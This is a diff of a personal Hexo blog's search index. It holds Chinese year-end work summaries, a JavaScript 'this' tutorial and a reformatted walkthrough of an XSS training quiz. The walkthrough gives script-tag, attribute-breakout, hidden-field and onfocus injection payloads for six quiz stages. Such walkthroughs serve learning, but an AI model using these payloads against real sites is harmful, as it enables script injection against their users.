@@ -57,6 +57,26 @@ d&amp;Hyscvnm
       </tags>
   </entry>
   <entry>
+    <title>2017年终总结</title>
+    <url>/2018/01/09/2017%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>各位领导、同事们：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;大家下午好!</p>
+<p>&nbsp;&nbsp;很荣幸有这次发言机会，同时感谢各位同事对我个人工作的鼎力支持。</p>
+<p>&nbsp;&nbsp;2017年是我工作的第二年，2017年我主要从某项目的开发、维护、以及故障处理展开。</p>
+<p>&nbsp;&nbsp;新增开发方面：对于一般的页面需求，现在已经开发出几套样式模板，可以提供给用户选择；另外，对于有特殊要求的用户，也可以按照用户要求的样式进行开发，让它既可通用，也可个性。另外，对于三方厂家开发方面，我们是对其开发的模板进行查错和功能检查后，才上线，尽量减少上线后故障，做到早发现早处理。</p>
+<p>&nbsp;&nbsp;日常维护方面：主要是日常针对用户后续需求、页面及视频进行修改。</p>
+<p>&nbsp;&nbsp;故障处理是商业电视的难点，主要处理运维接到的商业电视故障。涉及的问题比较广泛而且不确定性比较大，有些问题能够彻底解决，比如模板问题，排序问题，页面跳转问题等，这些问题占了大部分。而有些问题由于设备、环境等因素，也只能做好规避，力求少出现甚至不出现，这里有终端问题、网络问题等，比如6月份遇到的香格里拉酒店首页开机偶发性黑屏问题，虽然配合运维进行了多项查证，最后也只能做到尽可能的兼容，这类问题占少数。</p>
+<p>&nbsp;&nbsp;此外，也协助遇到的一些技术问题。包含一些常规的bug检查和指导修复。</p>
+<p>&nbsp;&nbsp;存在不足：一是工作纷繁复杂，需要时间学习，二是工作中不够大胆，要在不断的学习过程中改变工作方法，不断创新完善。</p>
+<p>&nbsp;&nbsp;明年打算：主要还是努力做好并完善本职工作，对于新需求，应该做到又好又快完成，对于故障处理，仍应该做到尽快响应，及时与运维交流，共同处理问题。</p>
+<p>&nbsp;&nbsp;以上就是我今年的工作总结。</p>
+<p>&nbsp;&nbsp;最后，春节临近，祝各位身体健康，万事如意！</p>
+]]></content>
+      <tags>
+        <tag>2017</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>141. Linked List Cycle</title>
     <url>/2017/06/19/141-Linked-List-Cycle/</url>
     <content><![CDATA[<p>Given a linked list, determine if it has a cycle in it.</p>
@@ -1116,8 +1136,8 @@ color:rgb(199,37,78)
 ]]></content>
       <tags>
         <tag>Optimize(优化)</tag>
-        <tag>LeetCode-medium</tag>
         <tag>快慢指针</tag>
+        <tag>LeetCode-medium</tag>
       </tags>
   </entry>
   <entry>
@@ -1484,46 +1504,35 @@ return [0, 1].
   <entry>
     <title>2016总结</title>
     <url>/2017/01/02/2016%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<blockquote>
-<p>我觉得，总结这种事情，不是通过总结来展示自己过去做了什么，可以说什么。更应该是通过总结，来得知自己和目标之间又近了多少，未来应该如何走。</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="毕业"><a href="#毕业" class="headerlink" title="毕业"></a>毕业</h2><blockquote>
-<p>上半年基本上忙着毕业了，一二月份基本过年懈怠了。但是，看到一条新闻，Alphago要在3月挑战人类围棋，感觉很震撼，上一次是深蓝在1997年国际象棋成功战胜人类。计算机在这19年里更进一步了，不单单是暴力计算这么简单了。<br><br>三月份去了杭州实习，认识了许多人，见到了很多不同的人。一个月很快就过去了，看到了李世石败给了Alphago，见证了围棋上计算机的历史时刻。<br><br>四五月份忙着毕业设计了，了解了Spring框架和Hibernate框架，总的感觉，框架这种东西，很难去描述它，使用框架本身没有意义，还是应该多去了解框架本身的设计以及解决了什么问题，这才是框架被设计出来的意义。<br><br>六月份忙着结束大学生涯了，顺便和舍友去了九寨沟，九寨沟真的很漂亮，是我见过的最漂亮的山水。月底到了公司报到。<br></p>
-</blockquote>
-<h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><blockquote>
-<p>七月份正式开始了职业生涯，实习期坐了一个月板凳，公司缺乏相应的技术人员，大部分人都是产品，但我觉得，我才毕业，一定有什么地方需要学习。虽然我被安排搞了JS，但是，我觉得没问题，刚好也想看看，顺便学了。一开始，做的业务简单，使用基本的JS操作就够用了，JS不像Java那样的类设计，最简单从上向下写加上部分封装就够用了。<br><br>八月份，被调去厂家学习，虽然只有3个人的技术，但是人都很不错，看到同龄的小伙子没有上大学走的培训，心里很复杂，一是觉得他很厉害了，二是觉得对不起我的大学了。没事，继续学，学了很多业务上的东西。公司的业务也接触了差不多了。基本的HTML+css+JS已经没什么问题了。<br><br>九月份，经历了G20峰会，闲了一个周。这期间：</p>
-<ol>
-<li><p>连同七八月份的零星时间，在github上放了个人主页，用Hexo建了一个博客；</p>
-</li>
-<li><p>买了一个个人vps，方便外出看看，在上面搭了一个Apache，顺便研究下linux和apache；</p>
-</li>
-<li><p>开始刷LeetCode，感觉这些问题很有意思，其实很像工作上的业务需求。</p>
-</li>
-</ol>
-<p>一直到九月底，我已经在厂家呆了两个月了，做了六个小项目，用了公司的fw框架，或者用自己写的JS代码。<br><br>十月份回了本部，开始接手宾馆模板业务，增加宾馆模板，按照需求修改模板，改bug，接手到了月底。<br><br>10月26被外派到了湖州开发云梯4.0项目，发现什么都没有，开发就俩，想了下，嗯，前端开发也够了，努力搞完我还想回杭州呢，搞了10天，完成4个小Demo，当地开发还是机智，利用了爬虫，对于新闻这种需要维护的麻烦不讨好的交给了别人，我们爬取就好了。技术上：</p>
-<ol>
-<li><p>习得流式布局，以前由于电视适配问题，一直用的最简单的绝对定位。给页面加特效。</p>
-</li>
-<li><p>JQuery的使用。</p>
-</li>
-<li><p>Json是什么，怎么用。</p>
-</li>
-<li><p>对于fw这个框架有了更深刻的理解，现在已经可以看懂了。</p>
-</li>
-</ol>
-<p>11月4号搞定回到了本部，告知我没有数据库，只有数据，要我做个页面展示，动态的。ok，利用json搞定。<br><br>后面的话，基本上慢慢转移宾馆业务到我的手上。<br><br>一直到12月10号左右开始交接bug或者说问题处理时，我才发现这是个对我来说的大坑，我交际弱，一开始，我有点不太想去大电话，但到了你的脸上，也只能去问了，我总结了几点：</p>
-<ol>
-<li><p>和陌生人交流要有礼貌，因为，毕竟你给别人打，只要能问出结果，那么其实是你的成功，多几句礼貌用语又有何妨。</p>
-</li>
-<li><p>总有人踢足球，我不信你还能踢回去，总有人能帮你解决，就怕你这足球没气了。</p>
-</li>
-<li><p>有些问题，不是你的问题，可能是多方面的原因或者说这个体制就是问题，失败了可能已是必然的，那为什么还要继续前行？因为没有什么能让我后退，大不了我就适时放弃。</p>
-</li>
-</ol>
-<p>12月底抢了回家的票，感受到了春运，看到了知乎的评论，感受到了计算机不能从技术直接拯救中国。。<br><br>给胡总过完生日已是2017年1月1号，我去打了一天dota2，毕竟玩了八年。想一想，ze dong 没玩了，因为他最后去了清华，那里应该有他更值得付出的东西。LY没玩了，因为，对于他这种老玩家，游戏是带来娱乐的，不是上分的痛苦。zs没玩了，毕竟只是个游戏，他肯定不会在一个娱乐的游戏上投入太多；人杰没玩了，他去打了英雄联盟，估计应该钻石了。<br><br>剩下一帮大学舍友过来坑我，简直太困难了。但是，我还是想说一句，我如果还要打，我要上5000分，才对得起我这8年dota生涯啊。</p>
-</blockquote>
-<p>我还是喜欢阿甘的大智若愚和安迪20年的坚持，同时，也感慨《面对巨人》里，4倍于自身的定位。我觉至少这就是我2017年的目标，努力提升自己，看到更好的世界！</p>
+    <content><![CDATA[<p>&nbsp;&nbsp;我觉得，总结这种事情，不是通过总结来展示自己过去做了什么。而是应该是通过总结，得知自己和目标之间又近了多少，未来应该如何走。<br><img src="\images\九寨沟.jpg" alt><br><a id="more"></a></p>
+<h2 id="毕业"><a href="#毕业" class="headerlink" title="毕业"></a>毕业</h2><p>&nbsp;&nbsp;2016年的一二月随着春节将近而逝去了。期间看到一条很有意思的新闻，Alphago要在3月挑战人类围棋，深受感触，上一次人机大战是深蓝在1997年国际象棋中成功战胜人类。CS在这19年里又进步了~！</p>
+<p>&nbsp;&nbsp;三月份去了杭州实习，见识到了很多人。一个月很快就过去了，期间见证了这场人机大战，深感”大人，时代变了！”。</p>
+<p>&nbsp;&nbsp;四五月份忙着毕业设计了，了解了Spring框架和Hibernate框架，对框架有了初步的认识。</p>
+<p>&nbsp;&nbsp;六月份忙着答辩，毕业旅行去了九寨沟，真是蓝天白云，波光粼粼！</p>
+<h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>&nbsp;&nbsp;七月份正式开始了职业生涯，实习期先学习了一个月，公司缺乏相应的技术人员，大部分人都是产品，但三人行必有我师。被安排开发前端页面，我觉得，语言并不是问题，问题的关键是逻辑。</p>
+<p>&nbsp;&nbsp;八月份，去厂家学习，虽然技术人员比较精简，但是每个人职责都很明确。习得了很多开发业务上的东西。期间初步掌握了HTML+CSS和基本的JavaScript语言开发。</p>
+<p>&nbsp;&nbsp;九月份，经历了G20峰会，维护期间暂停了相应业务，也休息了一周。这期间：</p>
+<ul>
+<li>连同七八月份的零星时间，用Hexo建了一个博客；</li>
+<li>搭建了一台VPS，了解了基本的Linux操作系统；</li>
+<li>开始刷LeetCode编程题目，感觉这些问题其实很有意思。</li>
+</ul>
+<p>&nbsp;&nbsp;一直到九月底，我已经在厂家学习了两个月，做了六个小项目，使用了fw框架一款焦点移动框架。</p>
+<p>&nbsp;&nbsp;十月份回了原单位，开始接手某模板业务，对模板进行开发和维护。</p>
+<p>&nbsp;&nbsp;10月26日，到湖州开发云梯4.0项目，主要与另一位前端开发配合，负责页面焦点逻辑的开发，完成4套功能页面开发，期间利用了爬虫技术，感觉这个技术值得研究。期间：</p>
+<ul>
+<li>习得流式布局和简单的CSS特效；</li>
+<li>JQuery的入门使用，AJAX；</li>
+<li>JSON数据格式在前后端中的重要作用；</li>
+<li>对于fw这个框架有了更深刻的理解。</li>
+</ul>
+<p>&nbsp;&nbsp;11月4号完成页面测试和展示后，回杭，又投入到了另一个页面开发，告知我没有数据库，只有数据，仅要求做个页面展示，数据动态即可。ok，利用JSON搞定。</p>
+<p>&nbsp;&nbsp;一直到12月10号左右开始交接业务维护工作时，我才发现这是个对我来说是个挑战，交流中总是处于被动使得工作量和效率受到影响，经过一段时间的交流，总结了几点：</p>
+<ul>
+<li>不卑不亢，与人交流要有礼貌，先礼后兵作为中国传统成语是有他道理的；</li>
+<li>该强硬时不能带有妇人之仁；</li>
+<li>顺其自然，当问题无法推进时，应该适时放弃。</li>
+</ul>
 ]]></content>
       <tags>
         <tag>2016</tag>
@@ -1550,7 +1559,7 @@ return [0, 1].
 </blockquote>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">	x : <span class="number">0</span>, </span><br><span class="line">	y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">			that.x = x; </span><br><span class="line">		&#125;; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">			that.y = y; </span><br><span class="line">		&#125; </span><br><span class="line">		moveX(x); </span><br><span class="line">		moveY(y); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;1 </span></span><br><span class="line">point.y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure>
 <p>当内部函数嵌套只有一层，那么还是符合<code>内部函数this绑定在外层函数对应的对象上</code>，但是，如果超过了1层嵌套，那么在高于1层的内部函数中，this对象如果不借助that，那么this将会指向window对象。</p>
-<h3 id="apply或call调用"><a href="#apply或call调用" class="headerlink" title="apply或call调用"></a>apply或call调用</h3><p>﻿<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">	<span class="keyword">this</span>.y = y; </span><br><span class="line">	<span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	    <span class="keyword">this</span>.x = x; </span><br><span class="line">	    <span class="keyword">this</span>.y = y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">var</span> p2 = &#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);</span><br></pre></td></tr></table></figure></p>
+<h3 id="apply或call调用"><a href="#apply或call调用" class="headerlink" title="apply或call调用"></a>apply或call调用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">	<span class="keyword">this</span>.y = y; </span><br><span class="line">	<span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	    <span class="keyword">this</span>.x = x; </span><br><span class="line">	    <span class="keyword">this</span>.y = y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">var</span> p2 = &#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);</span><br></pre></td></tr></table></figure>
 <p>这里p1是一个<code>Point {x: 1, y: 1}</code>对象，而p2则是一个<code>Object {x: 10, y: 10}</code>对象。</p>
 <h3 id="eval调用"><a href="#eval调用" class="headerlink" title="eval调用"></a>eval调用</h3><blockquote>
 <p>JavaScript 中的 eval 方法可以将字符串转换为 JavaScript 代码，使用 eval 方法时，this 指向哪里呢？答案很简单，看谁在调用 eval 方法，调用者的执行环境（ExecutionContext）中的 this 就被 eval 方法继承下来了。</p>
@@ -1832,7 +1841,7 @@ help(值为nu6的节点);return;
 <p><img src="http://i.imgur.com/O4dnoPP.png" alt></p>
 <p>例如：</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">JSP中最常见的一种语法：</span><br><span class="line">&lt;%=java代码%&gt;，就是一种很常见的模板写法。</span><br></pre></td></tr></table></figure>
-<p>而前端去操作的话，会使用JavaScript：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">'title'</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        url: <span class="string">"data.json"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#title"</span>).html(data.title);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>而前端去操作的话，会使用JavaScript：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">'title'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        url: <span class="string">"data.json"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#title"</span>).html(data.title);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>可能都会基于此种方式。</p>
 <p><strong>区别：</strong></p>
 <ol>
@@ -1859,100 +1868,79 @@ help(值为nu6的节点);return;
   <entry>
     <title>XSS过关小游戏~</title>
     <url>/2016/09/08/XSS%E8%BF%87%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！</p>
-</blockquote>
+    <content><![CDATA[<p>这个挺有意思的，日本人写的，入门XSS，感觉学到了不少！</p>
 <h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></p>
 </blockquote>
-<pre><code>&lt;img onerror=&quot;alert(document.domain);&quot; src= /&gt;
-</code></pre><p>or</p>
-<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
-</code></pre><a id="more"></a>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img onerror=<span class="string">"alert(document.domain);"</span> src= <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></p>
 </blockquote>
 <p>先用</p>
-<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
-</code></pre><p>检查源码，发现，组成</p>
-<pre><code>&lt;INPUT size=50 value=&quot;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot; name=p1&gt;
-</code></pre><p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;
-</code></pre><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>检查源码，发现，组成</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> value=<span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span> name=p1&gt;</span><br></pre></td></tr></table></figure>
+<p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></p>
 </blockquote>
 <p>输入：</p>
-<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
-</code></pre><p>源码显示：</p>
-<pre><code>&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;
-</code></pre><p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
-<pre><code>&lt;form action=&quot;?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f&quot; method=&quot;post&quot;&gt;
-Search a place: &lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;30&quot;&gt;
-&lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt; &amp;nbsp;
-Choose a country: &lt;select name=&quot;p2&quot;&gt;
-&lt;option&gt;Japan&lt;/option&gt;
-&lt;option&gt;Germany&lt;/option&gt;
-&lt;option&gt;USA&lt;/option&gt;
-&lt;option&gt;United Kingdom&lt;/option&gt;
-&lt;/select&gt;&lt;hr class=&quot;red&quot;&gt;We couldn&apos;t find any places called &lt;b&gt;&quot;&amp;lt;&amp;gt;&quot;&lt;/b&gt; in &lt;b&gt;Japan&lt;/b&gt;.&lt;hr class=&quot;red&quot;&gt;&lt;/form&gt;
-</code></pre><p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>源码显示：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;</span><br></pre></td></tr></table></figure>
+<p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">Search a place: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span> &amp;nbsp;</span><br><span class="line">Choose a country: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"p2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Germany<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>United Kingdom<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span>We couldn't find any places called <span class="tag">&lt;<span class="name">b</span>&gt;</span>"&amp;lt;&amp;gt;"<span class="tag">&lt;/<span class="name">b</span>&gt;</span> in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">b</span>&gt;</span>.<span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
 <p>修改dom：</p>
-<pre><code>document.forms[0].p2.childNodes[1].innerHtml = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
-</code></pre><p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
-<pre><code>document.forms[0].p2.childNodes[1].innerText = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
-</code></pre><p>这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p2.childNodes[<span class="number">1</span>].innerHtml = <span class="string">'&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
+<p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p2.childNodes[<span class="number">1</span>].innerText = <span class="string">'&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
+<p>这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。</p>
 <h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242</a></p>
 </blockquote>
 <p>此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。</p>
-<pre><code>document.forms[0].p3.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
-</code></pre><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p3.value = <span class="string">'"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
+<h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc</a></p>
 </blockquote>
 <p>长度限制，发现限制了文本输入长度，但只在表面上做了限制。</p>
-<pre><code>document.forms[0].p1.maxlength = 100
-</code></pre><p>修改输入框输入内容长度限制。然后注入：</p>
-<pre><code>document.forms[0].p1.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&quot;&apos;
-</code></pre><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p1.maxlength = <span class="number">100</span></span><br></pre></td></tr></table></figure>
+<p>修改输入框输入内容长度限制。然后注入：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p1.value = <span class="string">'"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"'</span></span><br></pre></td></tr></table></figure>
+<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999</a></p>
 </blockquote>
 <p>我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br><br>输入特殊字符发现：<code>&quot;</code>未被过滤，可以截断value输入，但是字符 <code>&lt;&gt;</code> 被转译。<br><br>仍存在注入。<br><br>通过添加事件注入！<br></p>
-<pre><code>&quot; onfocus=&quot;alert(document.domain);
-</code></pre><p>or</p>
-<pre><code>&quot; onfocus=&quot;alert(document.domain);&quot;
-</code></pre><p>==================Don’t look boring==========================</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
+<p>or</p>
